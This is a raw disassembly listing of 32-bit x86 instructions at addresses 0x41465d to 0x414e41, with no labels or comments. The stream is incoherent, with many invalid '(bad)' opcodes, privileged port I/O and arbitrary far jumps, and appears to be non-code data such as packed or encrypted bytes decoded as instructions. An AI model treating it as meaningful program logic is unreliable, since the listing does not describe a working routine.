  41465d:	sbb    dl,BYTE PTR gs:[esi+0x2c2bff18]
  414664:	jecxz  0x414621
  414666:	dec    esi
  414667:	pop    ebp
  414668:	pop    esp
  414669:	ins    DWORD PTR es:[edi],dx
  41466a:	inc    edi
  41466b:	add    al,0x96
  41466d:	dec    ebp
  41466e:	arpl   WORD PTR [esi],si
  414670:	mov    WORD PTR [ebp-0x66],cs
  414673:	cmp    al,0x2b
  414675:	cmp    DWORD PTR [eax+0x2859465],esi
  41467b:	add    ebp,edx
  41467d:	sahf   
  41467e:	push   eax
  41467f:	imul   ecx,ecx,0xffffff82
  414682:	sub    DWORD PTR ss:[edx+0x7574e8e4],edi
  414689:	je     0x4146ad
  41468b:	and    ecx,edx
  41468d:	and    eax,0x591a7429
  414692:	and    DWORD PTR [ecx],eax
  414694:	adc    eax,0x6c4fdca
  41469a:	xor    edx,edi
  41469c:	sbb    cl,BYTE PTR [ecx-0x4e]
  41469f:	mov    ah,0x39
  4146a1:	cs daa 
  4146a3:	mov    bl,0x5a
  4146a5:	cmp    dh,BYTE PTR [ecx+0x5702ebc1]
  4146ab:	mov    bl,0x1a
  4146ad:	pop    ebx
  4146ae:	push   edi
  4146af:	dec    ecx
  4146b0:	sbb    BYTE PTR [eax-0x14],al
  4146b3:	in     al,0x3a
  4146b5:	mov    ds:0xfaea757b,al
  4146ba:	stos   DWORD PTR es:[edi],eax
  4146bb:	cmp    cl,BYTE PTR [ebx]
  4146bd:	out    0xe6,al
  4146bf:	in     eax,0xca
  4146c1:	jb     0x4146eb
  4146c3:	popa   
  4146c4:	gs jbe 0x4146ed
  4146c7:	mov    al,0x9c
  4146c9:	pop    ss
  4146ca:	loop   0x414679
  4146cc:	pop    ds
  4146cd:	in     eax,dx
  4146ce:	ds jg  0x41467a
  4146d1:	inc    edi
  4146d2:	mov    esp,0x1cae8fd7
  4146d7:	test   al,0x1d
  4146d9:	(bad)
  4146de:	fcomp  DWORD PTR [ebp+eax*4-0x3ff23f1b]
  4146e5:	stos   DWORD PTR es:[edi],eax
  4146e6:	sub    eax,0xaee8844
  4146eb:	fwait
  4146ec:	cmp    al,0x5c
  4146ee:	outs   dx,DWORD PTR ds:[esi]
  4146ef:	ret    0x613e
  4146f2:	popf   
  4146f3:	mov    ebx,0x445f36a2
  4146f8:	hlt    
  4146f9:	dec    ebx
  4146fa:	xor    bl,bl
  4146fc:	jecxz  0x414772
  4146fe:	loopne 0x414686
  414700:	jg     0x4146c0
  414702:	pop    eax
  414703:	rcr    edi,cl
  414705:	lds    eax,FWORD PTR [eax-0x4]
  414708:	cmp    ecx,DWORD PTR [ecx+eiz*8+0x244d6649]
  41470f:	push   es
  414710:	inc    edi
  414711:	ss jg  0x414766
  414714:	int3   
  414715:	rcl    BYTE PTR [ecx+0x42e29ecc],cl
  41471b:	cmp    DWORD PTR [edx-0x7ae321],0x17c3f737
  414725:	and    BYTE PTR [esi-0x3f],bh
  414728:	jmp    0xe705:0x2fa10729
  41472f:	scas   eax,DWORD PTR es:[edi]
  414730:	outs   dx,BYTE PTR ds:[esi]
  414731:	fadd   DWORD PTR [ebp+0x5a]
  414734:	(bad)
  414737:	aaa    
  414738:	in     ax,dx
  41473a:	icebp  
  41473b:	cmc    
  41473c:	dec    eax
  41473d:	add    al,0xdd
  41473f:	xchg   ebx,eax
  414740:	mov    dh,0x6d
  414742:	push   ds
  414743:	xchg   edi,eax
  414744:	mov    cl,0x8e
  414746:	jmp    DWORD PTR [eax-0x58abdfac]
  41474c:	test   ebx,0x22a145d9
  414752:	sahf   
  414753:	push   esi
  414754:	ror    DWORD PTR [edx-0x1a6d6280],1
  41475a:	repz imul edx,eax,0xffffffe2
  41475e:	push   ds
  41475f:	(bad)  
  414760:	push   eax
  414761:	daa    
  414762:	ins    BYTE PTR es:[edi],dx
  414763:	xor    eax,0x2463c7f7
  414768:	pop    edx
  414769:	jmp    0x414741
  41476b:	in     eax,0x9a
  41476d:	or     eax,0xde122a3f
  414772:	sub    bl,ch
  414774:	mov    al,0x41
  414776:	mov    ds:0x986e5506,eax
  41477b:	add    al,0x3b
  41477d:	xor    BYTE PTR [esi-0x18fd92c9],al
  414783:	push   ecx
  414784:	cmp    DWORD PTR [edx],ecx
  414786:	vhaddpd xmm7,xmm6,XMMWORD PTR [ebx+0x3b]
  41478b:	mov    eax,ds:0x3232db67
  414790:	sub    BYTE PTR [esi-0x2],dl
  414793:	xlat   BYTE PTR ds:[ebx]
  414794:	and    eax,0x927424c1
  414799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41479a:	scas   al,BYTE PTR es:[edi]
  41479b:	mov    ebp,0x849e251b
  4147a0:	test   al,0x20
  4147a2:	scas   al,BYTE PTR es:[edi]
  4147a3:	push   ds
  4147a4:	jbe    0x41473d
  4147a6:	cs fcomi st,st(7)
  4147a9:	mov    ebp,DWORD PTR [ebx-0x36dbfdce]
  4147af:	and    al,0x22
  4147b1:	inc    eax
  4147b2:	aad    0x21
  4147b4:	data16 fbstp TBYTE PTR [eax]
  4147b7:	scas   al,BYTE PTR es:[edi]
  4147b8:	sar    DWORD PTR [ecx+0x28815e9e],0x9e
  4147bf:	xchg   edx,eax
  4147c0:	popa   
  4147c1:	sti    
  4147c2:	jbe    0x41481a
  4147c4:	imul   ebx,esp,0x1
  4147c7:	dec    ebp
  4147c8:	enter  0x5342,0xb4
  4147cc:	xchg   ebx,eax
  4147cd:	leave  
  4147ce:	icebp  
  4147cf:	movzx  esp,BYTE PTR [edi+0x55273808]
  4147d6:	mov    al,0x5
  4147d8:	jb     0x41477e
  4147da:	mov    bl,BYTE PTR [ecx-0x7b30f0df]
  4147e0:	popf   
  4147e1:	jno    0x41485e
  4147e3:	(bad)  
  4147e4:	sbb    eax,0xe104fa5c
  4147e9:	call   0xf0e40300
  4147ee:	ins    BYTE PTR es:[edi],dx
  4147ef:	xor    DWORD PTR [edi+edi*4+0x12],esp
  4147f3:	leave  
  4147f4:	sub    al,0xfb
  4147f6:	test   BYTE PTR [ecx+0x47],dl
  4147f9:	sti    
  4147fa:	loop   0x414847
  4147fc:	mov    ah,0xb1
  4147fe:	popa   
  4147ff:	jp     0x414853
  414801:	jno    0x414870
  414803:	in     al,0x63
  414805:	mov    eax,0xab628133
  41480a:	mov    ch,0xbb
  41480c:	and    BYTE PTR [eax],bl
  41480e:	jo     0x41482d
  414810:	loopne 0x414866
  414812:	int    0x65
  414814:	mov    ah,0x64
  414816:	or     ebp,DWORD PTR [eax+0x4eae6af6]
  41481c:	cs int 0xbd
  41481f:	shl    DWORD PTR [esi],0xc9
  414822:	xor    eax,0x36b67733
  414827:	scas   al,BYTE PTR es:[edi]
  414828:	aaa    
  414829:	lods   al,BYTE PTR ds:[esi]
  41482a:	mov    dh,0x2a
  41482c:	dec    esi
  41482d:	xchg   ecx,eax
  41482e:	cs das 
  414830:	xor    eax,0x9db5aa28
  414835:	and    ecx,DWORD PTR [edi-0x3f]
  414838:	ss mov edi,0x40250fa6
  41483e:	in     eax,0xc5
  414840:	sbb    DWORD PTR [esi+0x983d4a8],esp
  414846:	jmp    0xd732:0xfacff547
  41484d:	jmp    0x901e73ff
  414852:	sbb    DWORD PTR [edx-0x62],ebx
  414855:	(bad)
  414859:	in     eax,0x50
  41485b:	imul   ebx,ebp,0x151295c
  414861:	cmp    BYTE PTR [esi-0x7a],ch
  414864:	enter  0x1c19,0x1b
  414868:	and    DWORD PTR [esi],ebx
  41486a:	or     al,0x6a
  41486c:	and    eax,0x985a70e4
  414871:	cs ins BYTE PTR es:[edi],dx
  414873:	stos   DWORD PTR es:[edi],eax
  414874:	rol    DWORD PTR [esi+0x57],cl
  414877:	adc    esi,edx
  414879:	ins    DWORD PTR es:[edi],dx
  41487a:	jb     0x414876
  41487c:	xor    DWORD PTR [esi+edi*2-0x487b5ad4],edi
  414883:	mov    ecx,0xdb3c58d0
  414888:	in     al,dx
  414889:	sub    al,0x87
  41488b:	mov    dh,0x70
  41488d:	hlt    
  41488e:	pushf  
  41488f:	stos   BYTE PTR es:[edi],al
  414890:	fisubr DWORD PTR [esi+0x407c2146]
  414896:	aad    0x8c
  414898:	xchg   ebp,eax
  414899:	cmp    bh,BYTE PTR [ecx-0x36]
  41489c:	rol    DWORD PTR [esi+0x66],1
  41489f:	xor    edx,DWORD PTR [eax-0x2467e1e8]
  4148a5:	les    edx,FWORD PTR [edx+0x306628c3]
  4148ab:	sbb    BYTE PTR [eax+0x19],al
  4148ae:	fbld   TBYTE PTR [edi]
  4148b0:	mov    ch,0x49
  4148b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b3:	lods   eax,DWORD PTR ds:[esi]
  4148b4:	pop    esi
  4148b5:	sbb    ch,BYTE PTR [eax+0x65a537da]
  4148bb:	pop    esi
  4148bc:	mov    esi,0x50644c3
  4148c1:	mov    ch,0x19
  4148c3:	je     0x4148c6
  4148c5:	mov    esp,0x439778b2
  4148ca:	or     al,BYTE PTR [edx]
  4148cc:	jno    0x41491a
  4148ce:	retf   0xfd1d
  4148d1:	jmp    0x1782:0x59cc2a45
  4148d8:	mov    BYTE PTR [ecx],al
  4148da:	lea    edx,ss:[edi+0x62]
  4148de:	jne    0x41493c
  4148e0:	pop    esi
  4148e1:	out    0xa7,eax
  4148e3:	sub    esp,ebx
  4148e5:	mov    esi,0x232f4ed
  4148ea:	jge    0x4148b5
  4148ec:	pop    edi
  4148ed:	ficom  DWORD PTR [eax]
  4148ef:	iret   
  4148f0:	loopne 0x41496e
  4148f2:	dec    edx
  4148f3:	test   al,0x42
  4148f5:	mov    ah,0x85
  4148f7:	push   0x1f347153
  4148fc:	mov    es,WORD PTR [edx-0x8dcc941]
  414902:	(bad)  
  414903:	into   
  414904:	test   DWORD PTR [edi+0x739fb124],esp
  41490a:	xchg   esp,eax
  41490b:	lods   al,BYTE PTR ds:[esi]
  41490c:	push   ebx
  41490d:	dec    esp
  41490e:	scas   al,BYTE PTR es:[edi]
  41490f:	movups xmm3,XMMWORD PTR [ebx+ebx*4+0x1a8233a7]
  414917:	adc    bl,BYTE PTR [esi+0x53]
  41491a:	push   esp
  41491b:	fwait
  41491c:	mov    dl,0x50
  41491e:	(bad)  
  41491f:	out    dx,al
  414920:	or     eax,0x3ec9d29a
  414925:	out    0xd9,al
  414927:	cmc    
  414928:	adc    bl,dl
  41492a:	sbb    esp,eax
  41492c:	push   ebx
  41492d:	inc    ebx
  41492e:	nop
  41492f:	cmc    
  414930:	test   DWORD PTR [esi+eax*1],0x702a8a7
  414937:	sbb    edx,eax
  414939:	add    BYTE PTR [edx-0x273e2525],dh
  41493f:	xchg   esp,eax
  414940:	xor    al,0xa9
  414942:	outs   dx,BYTE PTR ds:[esi]
  414943:	adc    DWORD PTR [ebx],0x32
  414946:	aas    
  414947:	aas    
  414948:	inc    edx
  414949:	or     BYTE PTR [edx],bh
  41494b:	(bad)  
  41494c:	mov    al,0x79
  41494e:	cdq    
  41494f:	sbb    esp,DWORD PTR [ebx+0x72]
  414952:	pop    edx
  414953:	mov    bl,BYTE PTR [ebp-0x7d132f54]
  414959:	outs   dx,DWORD PTR ds:[esi]
  41495b:	int    0xeb
  41495d:	bnd jl 0x41491b
  414960:	out    dx,eax
  414961:	pop    ebx
  414962:	xchg   DWORD PTR [ebx+0x67aed5e8],ecx
  414968:	dec    ecx
  414969:	popf   
  41496a:	in     al,0x97
  41496c:	mov    edx,0x5a4a2c7f
  414971:	in     al,0x95
  414973:	daa    
  414974:	cmp    ah,BYTE PTR [eax+0x6f079214]
  41497a:	pop    ds
  41497b:	add    al,0x4e
  41497d:	push   es
  41497e:	out    0xa5,eax
  414980:	stc    
  414981:	adc    BYTE PTR ds:0x364667ee,0xd8
  414988:	out    0xc7,al
  41498a:	push   ebp
  41498b:	mov    al,0x40
  41498d:	sub    BYTE PTR [esi],ch
  41498f:	push   ss
  414990:	pusha  
  414991:	push   0x7d
  414993:	and    BYTE PTR [esp+ecx*2-0x38e875b3],dl
  41499a:	pop    eax
  41499b:	cmp    BYTE PTR [ecx],bl
  41499d:	mov    WORD PTR ds:0x2b0d5ce2,cs
  4149a3:	inc    DWORD PTR [ebx-0x427fa486]
  4149a9:	sub    BYTE PTR [edi+0x5f],ah
  4149ac:	sbb    al,0xdc
  4149ae:	pop    ds
  4149af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b0:	cmp    BYTE PTR [esi+0x1711adb3],0xac
  4149b7:	xor    al,0x15
  4149b9:	push   DWORD PTR [ecx-0xd]
  4149bc:	pop    ecx
  4149bd:	inc    ecx
  4149be:	xchg   ebx,eax
  4149bf:	loop   0x414a12
  4149c1:	aad    0xbf
  4149c3:	pop    edx
  4149c4:	sub    eax,DWORD PTR [edi+0x2993387f]
  4149ca:	pop    edi
  4149cb:	adc    al,0x79
  4149cd:	add    BYTE PTR [ebx-0x7a991e11],dl
  4149d3:	sahf   
  4149d4:	sub    eax,0x749462c3
  4149d9:	inc    edx
  4149da:	jno    0x4149c0
  4149dc:	mov    ds:0xa4eb2bf5,eax
  4149e1:	hlt    
  4149e2:	ins    BYTE PTR es:[edi],dx
  4149e3:	leave  
  4149e4:	ret    0xe7ca
  4149e7:	(bad)  
  4149e8:	or     al,0x1a
  4149ea:	mov    ecx,0x4ef0fc05
  4149ef:	xchg   ebp,eax
  4149f0:	scas   al,BYTE PTR es:[edi]
  4149f1:	dec    ebp
  4149f2:	jge    0x414a10
  4149f4:	mov    edi,0x74d6e6ec
  4149f9:	adc    DWORD PTR [ebp+0x459c8229],eax
  4149ff:	std    
  414a00:	int3   
  414a01:	mov    esi,0x929d7e14
  414a06:	sbb    BYTE PTR [ecx+ebp*1-0x14],dl
  414a0a:	push   0x472754b1
  414a0f:	sti    
  414a10:	inc    ebx
  414a11:	fnstcw WORD PTR [esi-0x7d]
  414a14:	add    cl,BYTE PTR [edx+0x48]
  414a17:	xchg   esp,eax
  414a18:	icebp  
  414a19:	leave  
  414a1a:	jl     0x414a83
  414a1c:	es cmp eax,0x504f21f4
  414a22:	push   ds
  414a23:	retf   0xc03f
  414a26:	pop    ebp
  414a27:	jns    0x4149c5
  414a29:	sbb    eax,DWORD PTR [ecx+0x58]
  414a2c:	jnp    0x414a60
  414a2e:	jne    0x4149c5
  414a30:	daa    
  414a31:	push   esi
  414a32:	lahf   
  414a33:	or     edx,DWORD PTR [eax+0x2d]
  414a36:	adc    edx,DWORD PTR fs:[eax]
  414a39:	xchg   DWORD PTR fs:[esi],ebp
  414a3c:	popa   
  414a3d:	(bad)  
  414a3e:	xor    ch,ah
  414a40:	inc    ecx
  414a41:	scas   al,BYTE PTR es:[edi]
  414a42:	push   edx
  414a43:	and    DWORD PTR [esi-0x7a],esp
  414a46:	push   edx
  414a47:	repz (bad) 
  414a49:	sub    eax,eax
  414a4b:	mov    dh,0x8f
  414a4d:	ror    BYTE PTR [ecx+eiz*1+0x51a25c6d],1
  414a54:	xchg   edx,eax
  414a55:	xlat   BYTE PTR ds:[ebx]
  414a56:	popf   
  414a57:	cwde   
  414a58:	mov    ah,0xc8
  414a5a:	out    0x28,eax
  414a5c:	pusha  
  414a5d:	fist   WORD PTR [ecx]
  414a5f:	push   eax
  414a60:	fistp  WORD PTR [ebp+0xb]
  414a63:	and    cl,BYTE PTR [ebp+0x77cb2f54]
  414a69:	stos   BYTE PTR es:[edi],al
  414a6a:	arpl   dx,bp
  414a6c:	lea    esi,[ecx]
  414a6e:	cmp    eax,0xa5bde35f
  414a73:	in     eax,0xad
  414a75:	or     BYTE PTR [eax+0x51],dh
  414a78:	sub    eax,0xa97431c2
  414a7d:	shl    DWORD PTR [ebx-0x41],cl
  414a80:	bound  eax,QWORD PTR [eax+esi*4+0x74]
  414a84:	jp     0x414afb
  414a86:	cmp    eax,0xc208fdcb
  414a8b:	fcmovu st,st(4)
  414a8d:	test   eax,0x7b2635d8
  414a92:	pushf  
  414a93:	sub    DWORD PTR [ebx-0x4c],edx
  414a96:	adc    ebp,DWORD PTR [esi]
  414a98:	xor    BYTE PTR [eax+0x465f4fc1],cl
  414a9e:	jb     0x414abc
  414aa0:	mov    esi,edi
  414aa2:	scas   eax,DWORD PTR es:[edi]
  414aa3:	pop    ecx
  414aa4:	imul   ebp,DWORD PTR [ebp+0x141b62e6],0x35
  414aab:	adc    eax,0xfced5544
  414ab0:	mov    esp,0x64add4a0
  414ab5:	pop    edi
  414ab6:	loopne 0x414a89
  414ab8:	add    al,0x4f
  414aba:	mov    dl,0xcd
  414abc:	xor    ah,ch
  414abe:	xor    BYTE PTR [edx+ebx*1-0x6f],ah
  414ac2:	jmp    0xacf3d4d9
  414ac7:	jp     0x414a96
  414ac9:	aam    0xbc
  414acb:	jmp    0x33b1:0x73f0aa36
  414ad2:	inc    esp
  414ad3:	sahf   
  414ad4:	mov    cl,0x79
  414ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ad7:	adc    DWORD PTR [ebp-0x4e],ecx
  414ada:	xchg   edx,eax
  414adb:	stos   DWORD PTR es:[edi],eax
  414adc:	mov    ebx,0x4806ee7b
  414ae1:	cmp    dh,BYTE PTR [esi+esi*4-0x21]
  414ae5:	iret   
  414ae6:	mov    esp,0x541b69
  414aeb:	pop    ebp
  414aec:	in     al,0x64
  414aee:	and    eax,0x20b421af
  414af3:	(bad)  
  414af4:	jne    0x414ad4
  414af6:	cmc    
  414af7:	xchg   esi,eax
  414af8:	dec    esp
  414af9:	daa    
  414afa:	pop    esi
  414afb:	popf   
  414afc:	cli    
  414afd:	loope  0x414a83
  414aff:	cdq    
  414b00:	pop    ecx
  414b01:	cli    
  414b02:	lea    esp,[edi]
  414b04:	sti    
  414b05:	test   al,0x6f
  414b07:	js     0x414b28
  414b09:	gs stos DWORD PTR es:[edi],eax
  414b0b:	inc    edi
  414b0c:	pop    esp
  414b0d:	mov    cl,0x27
  414b0f:	sbb    BYTE PTR [ebp-0x57],0xfd
  414b13:	mov    ?,edi
  414b15:	or     al,dl
  414b17:	jecxz  0x414ad7
  414b19:	pop    ds
  414b1a:	push   ecx
  414b1b:	(bad)  
  414b1c:	adc    dh,dh
  414b1e:	push   eax
  414b1f:	lea    edx,[eax]
  414b21:	sahf   
  414b22:	sub    DWORD PTR [ebx],esi
  414b24:	xlat   BYTE PTR ds:[ebx]
  414b25:	jge    0x414adf
  414b27:	mov    eax,0x1ba69a15
  414b2c:	test   eax,0xc48b9a5e
  414b31:	inc    edi
  414b32:	or     eax,0xc1e95fe9
  414b37:	sub    cl,BYTE PTR [edx]
  414b39:	jb     0x414b5f
  414b3b:	cwde   
  414b3c:	mov    ch,0xa0
  414b3e:	imul   eax,DWORD PTR [ecx+0x1e4e3d70],0x1d4a7b45
  414b48:	int    0x69
  414b4a:	scas   eax,DWORD PTR es:[edi]
  414b4b:	adc    DWORD PTR [ebp-0x61],0x48386938
  414b52:	std    
  414b53:	mov    ecx,DWORD PTR [esi+0x11a345d8]
  414b59:	and    al,0xc1
  414b5b:	mov    ch,0xde
  414b5d:	adc    eax,0xc05c75db
  414b62:	out    0xf8,al
  414b64:	loopne 0x414bb6
  414b66:	jmp    0xc74561a1
  414b6b:	mov    fs,ebp
  414b6d:	dec    esp
  414b6e:	jno    0x414b2d
  414b70:	push   eax
  414b71:	xchg   esp,eax
  414b72:	dec    esi
  414b73:	sbb    eax,0xc42f8912
  414b78:	jl     0x414b1f
  414b7a:	mov    ecx,0x13a1d46a
  414b7f:	test   BYTE PTR [edi-0x6fc8ba74],dh
  414b85:	push   edi
  414b86:	(bad)  
  414b87:	stc    
  414b88:	rol    al,1
  414b8a:	dec    esp
  414b8b:	add    al,0x69
  414b8d:	outs   dx,DWORD PTR ds:[esi]
  414b8e:	(bad)  
  414b8f:	aad    0x43
  414b91:	sub    edx,DWORD PTR [ebp-0x73fdb869]
  414b97:	cmc    
  414b98:	xchg   ebp,eax
  414b99:	test   eax,0x5d913641
  414b9e:	dec    edx
  414b9f:	pop    eax
  414ba0:	clc    
  414ba1:	scas   al,BYTE PTR es:[edi]
  414ba2:	lock jno 0x414bdc
  414ba5:	mov    al,0x1c
  414ba7:	jmp    0x414b44
  414ba9:	mov    bl,0x6
  414bab:	mov    eax,ds:0x4db33097
  414bb0:	sbb    ecx,DWORD PTR cs:[ecx+0x62]
  414bb4:	add    eax,0xe3051666
  414bb9:	add    al,0x4a
  414bbb:	les    ebx,FWORD PTR ds:0x1a4b7cd9
  414bc1:	outs   dx,BYTE PTR ds:[esi]
  414bc2:	cmp    BYTE PTR [ebx-0x3a],al
  414bc5:	adc    DWORD PTR [ecx],0xea77ddc2
  414bcb:	cmp    ebx,edx
  414bcd:	inc    edx
  414bce:	sbb    ch,dh
  414bd0:	mov    WORD PTR [si+0x719e],fs
  414bd5:	idiv   ebp
  414bd7:	test   DWORD PTR [edi-0x3b57e7b3],eax
  414bdd:	add    esp,DWORD PTR [eax-0x18]
  414be0:	out    0xed,eax
  414be2:	push   ss
  414be3:	sahf   
  414be4:	inc    esp
  414be5:	mov    ebx,0xf77d78ba
  414bea:	xor    eax,0x34f4c61
  414bef:	add    al,0x21
  414bf1:	mov    eax,ds:0xe8bf244f
  414bf6:	js     0x414c63
  414bf8:	cmc    
  414bf9:	(bad)  
  414bfa:	test   DWORD PTR [ecx],0xdebd9a7f
  414c00:	mov    al,0xfe
  414c02:	sub    eax,0x9e389552
  414c07:	sbb    ah,0xbc
  414c0a:	mov    ds:0x69890b1d,eax
  414c0f:	int    0x58
  414c11:	fadd   DWORD PTR [ecx]
  414c13:	xor    al,0xb0
  414c15:	minps  xmm7,XMMWORD PTR [ebx+0x41]
  414c19:	xchg   ebp,eax
  414c1a:	jmp    0x414ba2
  414c1c:	xor    BYTE PTR [ebp+0x5b],ch
  414c1f:	es dec esp
  414c21:	rcr    DWORD PTR [edx],1
  414c23:	hlt    
  414c24:	inc    ebx
  414c25:	cwde   
  414c26:	mov    ?,WORD PTR [ebx+0x41]
  414c29:	pop    ebp
  414c2a:	pop    ss
  414c2b:	cmp    eax,0x3c86c3e9
  414c30:	jle    0x414c5a
  414c32:	mov    al,0xb2
  414c34:	dec    esi
  414c35:	mov    al,0xa8
  414c37:	mov    esi,0x9211a52f
  414c3c:	pop    esp
  414c3d:	rol    DWORD PTR [ebp+0x70],0xc2
  414c41:	fwait
  414c42:	retf   0x1fea
  414c45:	pop    esp
  414c46:	sub    BYTE PTR [edx-0x35],0x74
  414c4a:	mov    al,ds:0x545561ed
  414c4f:	inc    ebp
  414c50:	jecxz  0x414caf
  414c52:	inc    edx
  414c53:	fld    DWORD PTR [ebp-0x2e68b931]
  414c59:	mov    ch,0xc5
  414c5b:	stc    
  414c5c:	xchg   ebx,eax
  414c5d:	inc    edi
  414c5e:	lock inc ebp
  414c60:	sub    al,0xd4
  414c62:	mov    cl,0xed
  414c64:	inc    edi
  414c65:	mov    ecx,0xb0f44d18
  414c6a:	popa   
  414c6b:	sbb    eax,0xf6791923
  414c70:	clc    
  414c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c72:	pushf  
  414c73:	(bad)  
  414c74:	jbe    0x414cb6
  414c76:	jno    0x414c0d
  414c78:	aad    0xce
  414c7a:	arpl   bx,sp
  414c7c:	dec    edx
  414c7d:	push   0xffffffdd
  414c7f:	adc    eax,0xf09dd8d9
  414c84:	cwde   
  414c85:	pop    ss
  414c86:	xchg   edx,eax
  414c87:	and    eax,0x472cf199
  414c8c:	lods   eax,DWORD PTR ds:[esi]
  414c8d:	mov    ch,0x84
  414c8f:	jp     0x414c3b
  414c91:	sar    esp,1
  414c93:	cmp    DWORD PTR gs:[ecx-0x5e],ecx
  414c97:	(bad)  
  414c98:	imul   esp,DWORD PTR [esi-0x2771db8c],0xffffffd6
  414c9f:	(bad)  
  414ca0:	lahf   
  414ca1:	pop    esi
  414ca2:	les    esi,FWORD PTR [edi+0x5]
  414ca5:	push   0xc9b1c174
  414caa:	and    BYTE PTR [ebp-0x7592ad76],cl
  414cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cb1:	mov    bh,0x2b
  414cb3:	mov    ds:0x9d8e781e,eax
  414cb8:	or     eax,0xe8227804
  414cbd:	mov    esp,0xaa1716ec
  414cc2:	js     0x414d22
  414cc4:	lock mov ?,WORD PTR [edi+ebx*1+0x54]
  414cc9:	mov    edi,0xe494bd61
  414cce:	fcomp  DWORD PTR [edx]
  414cd0:	cmp    DWORD PTR [edi],edi
  414cd2:	cmp    bh,cl
  414cd4:	sub    al,BYTE PTR [esi-0x198320fc]
  414cda:	pop    ebx
  414cdb:	xchg   edx,eax
  414cdc:	jmp    0xa83086e6
  414ce1:	es dec esp
  414ce3:	and    eax,0x67114433
  414ce8:	sub    edi,eax
  414cea:	daa    
  414ceb:	clc    
  414cec:	pop    esi
  414ced:	jecxz  0x414d38
  414cef:	adc    eax,0x4292ee82
  414cf4:	and    BYTE PTR [ebp+edx*1+0x137e71c9],bl
  414cfb:	push   eax
  414cfc:	adc    al,0x23
  414cfe:	dec    edx
  414cff:	mov    ebx,0xa666ac8
  414d04:	adc    ebx,0xffffffe0
  414d07:	adc    BYTE PTR gs:[esi],al
  414d0a:	lock mov eax,0xbfd04b79
  414d10:	push   ebx
  414d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d12:	aam    0xbf
  414d14:	(bad)  
  414d15:	test   al,0xd4
  414d17:	dec    edi
  414d18:	inc    edi
  414d19:	and    al,0x90
  414d1b:	shl    ebx,0x32
  414d1e:	jb     0x414d86
  414d20:	pusha  
  414d21:	sub    ch,ch
  414d23:	xor    al,0x41
  414d25:	pop    ss
  414d26:	jg     0x414cc6
  414d28:	enter  0x4a8a,0x74
  414d2c:	inc    eax
  414d2d:	jno    0x414d1f
  414d2f:	clc    
  414d30:	inc    eax
  414d31:	ins    DWORD PTR es:[edi],dx
  414d32:	into   
  414d33:	clc    
  414d34:	fisub  WORD PTR [ecx+0x46]
  414d37:	pop    di
  414d39:	jae    0x414d64
  414d3b:	jo     0x414d28
  414d3d:	push   ds
  414d3e:	and    DWORD PTR [edi+0x38],0x32
  414d42:	test   BYTE PTR [esi+edi*4],0x6
  414d46:	jne    0x414d5c
  414d48:	lds    esp,FWORD PTR [edx-0x620c48c]
  414d4e:	pop    es
  414d4f:	dec    edx
  414d50:	pop    ebx
  414d51:	popf   
  414d52:	xor    ecx,edi
  414d54:	jp     0x414d72
  414d56:	fwait
  414d57:	(bad)  
  414d58:	clc    
  414d59:	sbb    ebx,esp
  414d5b:	add    eax,0x9cbfc248
  414d60:	xor    al,0xd5
  414d62:	sar    DWORD PTR [edi-0x2b],0x0
  414d66:	ss push edx
  414d68:	rcr    si,cl
  414d6b:	mov    al,ds:0xc5efa73c
  414d70:	les    eax,FWORD PTR cs:[ebx+eiz*8-0x4c92a791]
  414d78:	mov    ah,bl
  414d7a:	ja     0x414da9
  414d7c:	add    eax,0xd35542b1
  414d81:	lahf   
  414d82:	iret   
  414d83:	xchg   esp,eax
  414d84:	paddb  mm4,QWORD PTR [ecx-0x595deab7]
  414d8b:	(bad)  
  414d8c:	sbb    al,0xc6
  414d8e:	jbe    0x414d27
  414d90:	stos   BYTE PTR es:[edi],al
  414d91:	dec    eax
  414d92:	or     al,0x1d
  414d94:	add    bl,BYTE PTR [edx]
  414d96:	div    BYTE PTR [ecx-0x63]
  414d99:	or     BYTE PTR [ecx-0x39],al
  414d9c:	inc    edx
  414d9d:	(bad)  
  414d9e:	call   0x3f6b:0x71555f80
  414da5:	push   0x5
  414da7:	sub    eax,DWORD PTR [edx-0x2118fc15]
  414dad:	mov    edx,DWORD PTR [eax+0x45b6c893]
  414db3:	push   eax
  414db4:	stc    
  414db5:	sub    edx,DWORD PTR [ecx+0x5b181f13]
  414dbb:	mov    ds:0x619e8454,eax
  414dc0:	cmp    BYTE PTR [ecx-0x63d904a9],dh
  414dc6:	stos   BYTE PTR es:[edi],al
  414dc7:	or     al,0x4f
  414dc9:	jg     0x414e34
  414dcb:	out    dx,eax
  414dcc:	retf   0xb38a
  414dcf:	addr16 test al,0x60
  414dd2:	sahf   
  414dd3:	mov    esp,0xa9f4800c
  414dd8:	les    esp,FWORD PTR [eax]
  414dda:	aad    0x8e
  414ddc:	and    dh,dl
  414dde:	fild   WORD PTR [ebx]
  414de0:	aad    0xe0
  414de2:	popf   
  414de3:	and    dh,bl
  414de5:	rcl    BYTE PTR [esi+0x30],0x6b
  414de9:	mul    bl
  414deb:	jb     0x414e3e
  414ded:	cmp    DWORD PTR [esi-0x3cece55a],ecx
  414df3:	add    edx,DWORD PTR [ecx+0x1ffed487]
  414df9:	push   0xb5b190bd
  414dfe:	xlat   BYTE PTR ds:[ebx]
  414dff:	(bad)  
  414e00:	(bad)  [edi]
  414e02:	add    BYTE PTR [edi],bh
  414e04:	push   es
  414e05:	pop    edi
  414e06:	ret    
  414e07:	xchg   esi,eax
  414e08:	adc    ebx,DWORD PTR [eax]
  414e0a:	xchg   ebp,eax
  414e0b:	aas    
  414e0c:	sub    al,0x53
  414e0e:	mov    al,ds:0x495fe0a3
  414e13:	loop   0x414dd2
  414e15:	mov    ebp,0x36eca261
  414e1a:	ret    0xce31
  414e1d:	jmp    0x5955cffd
  414e22:	mov    esp,0xd113d634
  414e27:	les    ebp,FWORD PTR [eax-0x50]
  414e2a:	pop    ecx
  414e2b:	inc    edx
  414e2c:	mul    ebx
  414e2e:	and    eax,0x8aa95673
  414e33:	popf   
  414e34:	sub    bl,BYTE PTR [edi]
  414e36:	mov    ds:0xef2b6092,al
  414e3b:	add    ebp,ebp
  414e3d:	daa    
  414e3e:	jmp    FWORD PTR [ebx-0x61]
  414e41:	aas    
